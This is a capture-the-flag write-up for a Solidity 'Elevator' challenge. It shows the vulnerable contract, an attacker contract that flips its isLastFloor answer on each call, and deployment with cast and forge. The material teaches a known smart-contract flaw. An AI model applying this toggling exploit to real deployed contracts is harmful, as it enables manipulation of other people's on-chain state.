# Task

This elevator won't let you reach the top of your building. Right?

# Contract

```sol

pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
This Solidity contract simulates an elevator system with two main components: `Building` and `Elevator`. The `Elevator` contract has a `goTo` function that takes a floor number and interacts with a `Building` contract (the caller). It first checks if the floor is the last floor using the `isLastFloor` function from the `Building` contract. If it's not the last floor, it updates the current floor and checks again to determine if the elevator is at the top floor. The `top` variable reflects whether the elevator has reached the top floor.

Lets get the contract address and contract abi

We'll start out by using cast to check the state of the elevator

We get the "false" response, this means we aren't at the top of the building yet

Lets check the floor we are at

We are at floor "0".

To solve this chall we have to be on the last floor. Lets write our attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./elevator.sol";

contract elevatorAttack {
   bool public toggle = true;
   Elevator public target;

   constructor(address _targetAddr) public {
    target = Elevator(_targetAddr);
   }
   
   function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
   }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```
what does this attack contract do??

1. It imports the `Elevator` contract and sets it as the target during construction (constructor).
2. The `isLastFloor` function alternates (toggles) between returning true and false on each call.
3. By alternating the `isLastFloor` return value, the `goTo` function in the `Elevato`r contract can be tricked into thinking it hasnâ€™t reached the top floor, even when it has, due to the changing return value.
4. The `setTop` function is used to call the `goTo` function in the `Elevator` contract, exploiting this behavior to bypass the condition and manipulate the elevator's top status.


Lets deploy this attack contract with forge

Now that we've successfully deployed this, lets interact with the functions

We'll start by setting the top to say "floor 20"

Nicee, our transaction got successful

Now, lets check the floor again

![image](https://github.com/user-attachments/assets/c5b0cedd-c783-4f62-b0e3-91427dd2b15e)

Good, we can now go ahead to check if we are at the top of the elevator or not

![image](https://github.com/user-attachments/assets/e116090a-dc35-45a4-8e9f-904159927b57)

We got the "true" output, which means we have successfully reached the top of the building

You can go ahead to submit the instance
